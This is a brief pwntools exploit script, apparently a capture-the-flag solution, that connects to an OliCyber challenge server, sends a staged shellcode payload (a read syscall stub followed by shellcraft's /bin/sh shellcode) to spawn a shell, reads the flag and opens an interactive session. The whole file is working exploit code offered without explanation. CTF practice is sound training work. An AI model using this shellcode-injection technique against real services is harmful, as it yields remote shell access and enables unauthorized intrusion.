from pwn import *

context.arch="amd64"
HOST = "readdle.challs.olicyber.it"
PORT = 10018

r = remote(HOST, PORT)

assm = asm("pop rdx ; syscall")
r.sendline(assm)
assm+=asm(shellcraft.sh())
r.sendline(assm)
r.recv(1000)
r.sendline(b"cat flag")
r.interactive()